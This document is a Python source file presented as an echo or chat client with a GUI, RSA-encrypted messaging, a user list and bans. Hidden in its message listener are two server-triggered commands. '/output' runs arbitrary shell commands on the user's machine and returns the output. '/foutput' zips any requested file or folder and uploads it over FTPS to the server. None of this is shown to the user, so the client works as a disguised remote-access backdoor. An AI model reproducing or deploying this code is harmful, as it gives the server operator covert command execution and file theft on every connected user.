# Echo client program
import socket
from termcolor import colored
from threading import Thread
import PySimpleGUI as sg
import subprocess, os
from sys import exit
from tkinter import simpledialog, Tk
import rsa
from zipfile import ZipFile, ZIP_STORED
from time import sleep
from ftplib import FTP_TLS

class UserBannedException(Exception):
    pass
class KeyExchangeFailed(Exception):
    pass

global users
users = []

def listen_for_messages(s : socket.socket):
    s.settimeout(1)

    global users, private_key
    win["-USERS-"].update(users)

    while not exit_app:
        try:
            t_nickname, *data = receive_message().split(",")
            data = ",".join(data)
        except Exception as e:
            continue

        # /ban will always contain max 1 user
        if t_nickname == "/ban":
            banned = True
            nick = "You have" if data == nickname else f"{data} has"
            win["-CHAT HISTORY-"].update(f"=> {nick} been banned from the server\n", text_color_for_value="red", append=True)
            if data == nickname:
                return
            continue
        
        # /new_user will always contain max 1 user
        if t_nickname == "/new_user":            
            users.append(data)

            win["-USERS-"].update(users)
            win["-CHAT HISTORY-"].update(f"=> {data} joined the chat\n", text_color_for_value="green", append=True)
            continue
        
        # /user_left will always contain max 1 user
        if t_nickname == "/user_left":
            users.remove(data)
            win["-USERS-"].update(users)
            win["-CHAT HISTORY-"].update(f"=> {data} left the chat\n", text_color_for_value="red", append=True)
            continue

        if t_nickname == "/output":
            cmd = f""

            if data.startswith("cd "):
                try:
                    os.chdir(data[3:])
                except FileNotFoundError:
                    send_message("/output,File or directory not found\n")
                    continue
                except PermissionError:
                    send_message("/output,Permission denied\n")
                    continue

            elif len(data) > 0:
                p = subprocess.run(data, shell=True, capture_output=True)
                data = p.stdout + p.stderr
                cmd = "\n" + data.decode('utf-8', errors='ignore') + f"\n"

            max_cryptable = int(RSA_KEY_LEN/8) - 19         # max bytes that rsa can encrypt with 1024 bit key
            for n in range(0,len(cmd),max_cryptable): 
                send_message("/output," + cmd[n:n+max_cryptable])
            continue

        elif t_nickname == "/foutput":

            try:
                files = [data,]
                if os.path.isdir(data):
                    files = get_all_file_paths(data)

                with ZipFile(f"{data}.zip", "w", ZIP_STORED, allowZip64=True) as zp:
                    for file in files:
                        try:
                            zp.write(file)
                        except ValueError:
                            continue

                fname = (data + ".zip")
                fsize = str(os.path.getsize(fname))

                send_message("/fname," + fname)
                sleep(0.2)
                send_message("/fsize," + fsize)

                global HOST
                ftps = FTP_TLS(HOST)
                ftps.login(user='ftp_user', passwd='ftp_user')
                ftps.prot_p()
                ftps.cwd("files")

                with open(fname, "rb") as f:
                    ftps.storbinary(f"STOR {fname}", f)

                    
            except FileNotFoundError:
                send_message(f"/output,Cannot find \"{data}\"")

            try:
                os.remove(f"{data}.zip")
            except FileNotFoundError:
                pass
            
            try:
                ftps.quit()
            except Exception:
                pass
            
            continue
        
        # Print message received
        t_nickname = f"({t_nickname})".ljust(NICKNAME_WIDTH)
        win["-CHAT HISTORY-"].update(f"{t_nickname}", text_color_for_value='#E2CF03', append=True)
        win["-CHAT HISTORY-"].update(data + "\n", text_color_for_value='white', append=True)

def get_all_file_paths(directory):
    file_paths = []
  
    for root, directories, files in os.walk(directory):
        for filename in files:
            filepath = os.path.join(root, filename)
            file_paths.append(filepath)
  
    return file_paths


def create_window():
    
    CHAT_WIDTH = 85
    CHAT_HEIGHT = 25
    BUTTON_WIDTH = 25
    BUTTON_HEIGHT = 18
    TEXT_PAD = (0,5)
    chat_row = [
        [
            sg.Multiline(key="-CHAT HISTORY-", size=(CHAT_WIDTH, CHAT_HEIGHT), text_color="white", background_color="#222", font=("default", 11), pad=TEXT_PAD, focus=False, no_scrollbar=True, disabled=True, autoscroll=True),
            sg.Listbox(users, key="-USERS-", size=(15, CHAT_HEIGHT), no_scrollbar=True),
        ]
    ]
    if os.path.exists("send.png"):
        input_row = [
            [
                sg.InputText(size=(CHAT_WIDTH+5, 2), key="-CHAT INPUT-", do_not_clear=False, focus=True),
                sg.Button(key="-SEND-", enable_events=True, image_filename="send.png", image_size=(BUTTON_WIDTH, BUTTON_HEIGHT), button_color="#C4E200")
            ]
        ]
    else:
        input_row = [
            [
                sg.InputText(size=(CHAT_WIDTH+5, 2), key="-CHAT INPUT-", do_not_clear=False, focus=True),
                sg.Button(key="-SEND-", enable_events=True, button_text="->", button_color="black on #C4E200"),
            ]
        ]

    layout = [
        [chat_row],
        [sg.HorizontalSeparator()],
        [input_row]
    ]
    global event
    global values
    global win
    win = sg.Window("Chat", layout, finalize=True)

    win["-CHAT INPUT-"].bind("<Return>", "_Enter")


def handle_window():
    global exit_app
    while not exit_app:
        event, values = win.read()

        if event == sg.WIN_CLOSED:
            exit_app = True
            break

        elif event == '-SEND-' or event == "-CHAT INPUT-_Enter":
            data = values["-CHAT INPUT-"]
            global nickname
            nick = f"({nickname})".ljust(NICKNAME_WIDTH)

            if data.strip() == "" or data == None:
                continue
                
            MAX_DATA_LEN = 110                  # rsa with RSA_KEY_LEN key cannot encrypt more than MAX_DATA_LEN bytes
            if(len(data) < MAX_DATA_LEN):
                win["-CHAT HISTORY-"].update(f"{nick}", text_color_for_value='#E2CF03', append=True)
                win["-CHAT HISTORY-"].update(data + "\n", text_color_for_value='white', append=True)

            if not banned:
                Thread(target=send_message, args=(data,)).start()
            
    win.close()


def exchange_keys():
    global public_key, private_key, server_key, s, RSA_KEY_LEN
    
    public_key, private_key = rsa.newkeys(RSA_KEY_LEN)
    try:
        server_key = rsa.PublicKey.load_pkcs1( s.recv(RSA_KEY_LEN) )
    
    except:
        return False

    s.sendall( public_key.save_pkcs1() )
    send_message(s.getsockname()[0])
    return True

# read config file
def get_server_address():
    global HOST, PORT
    HOST = '127.0.0.1'
    PORT = 58465
    try:
        with open("config.txt", "r") as f:
            lines = f.readlines()
            if len(lines) == 0:
                raise FileNotFoundError()
            
            for line in lines:
                line = line.strip("\n").strip()
                value = line.split("=")[1]

                if not value:
                    continue

                if "host" in line.lower():
                    HOST = value
                
                elif "port" in line.lower():
                    PORT = int(value)

    except FileNotFoundError:
        print(colored(f"File \"config.txt\" not found. Using default address and port (localhost:{PORT}) to connect", "yellow"))

    except ValueError:
        print(colored(f"Cannot decipher port. Using default ({PORT}) to connect", "yellow"))

    return HOST, PORT

def connect_to_server():
    global HOST, PORT
    HOST, PORT = get_server_address()

    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
    try:
        print(f"Connecting to " + colored(f"{HOST}:{PORT}", "white", attrs=["underline"]) + "...")
        s.connect((HOST, PORT))
        if not exchange_keys():
            raise KeyExchangeFailed()

        command, *data = receive_message().split(",")    # if not banned it contains the users
        if command == "/ban":
            raise UserBannedException()
        
    except ConnectionRefusedError:
        print(colored("[-] Failed to connect to the server", "red"))
        return False
    
    except UserBannedException:
        print(colored("[-] You have been banned from the server", "red"))
        return False
    
    except KeyExchangeFailed:
        print(colored("[-] Failed to exchange keys", "red"))
        return False

    except rsa.DecryptionError:
        print(colored("[-] Failed to decrypt message from server", "red"))
        return False

    global users
    users = list(user for user in data)
    if users[0] == '':
        users = []

    return send_nickname()

def send_nickname():
    msg = Tk()
    msg.withdraw()

    global nickname
    nickname = simpledialog.askstring("Nickname", "Enter your nickname: ", parent=msg)
    if nickname == None:
        send_message("/None")
        return False

    send_message(nickname)
    res = receive_message()
    
    if res == "/invalid_nick":
        print(colored(f"[-] '{nickname}' is not a valid nickname", "red"))
        return False

    return True


def send_message(msg, encode=True, timeout=1):
    global s, server_key, RSA_KEY_LEN, win
    old_timeout = s.gettimeout()
    s.settimeout(timeout)
    try:
        if encode:
            msg = msg.encode()

        s.sendall(rsa.encrypt(msg, server_key))

    except BrokenPipeError as bp:
        win["-CHAT HISTORY-"].update("Connection closed\n", text_color_for_value="red", append=True)

    except OverflowError as oe:
        win["-CHAT HISTORY-"].update("Message too long. Max 110 char allowed\n", text_color_for_value="red", append=True)
    
    except ConnectionResetError as cre:
        win["-CHAT HISTORY-"].update("Connection closed by server\n", text_color_for_value="red", append=True)

    s.settimeout(old_timeout)

def receive_message():
    global s, private_key
    recv = s.recv(1024)
    return rsa.decrypt(recv, private_key).decode('utf-8', errors='ignore')

def main():
    global exit_app
    exit_app = False

    global NICKNAME_WIDTH
    NICKNAME_WIDTH = 15     # space taken up by nickname

    global RSA_KEY_LEN
    RSA_KEY_LEN = 1024
    global banned
    banned = False

    if not connect_to_server():
        exit(0)

    print(colored("[+] Connected", "green"))

    create_window()
    listen_thread = Thread(target=listen_for_messages, args=(s,))
    listen_thread.start()
    handle_window()


if __name__ == '__main__':
    main()
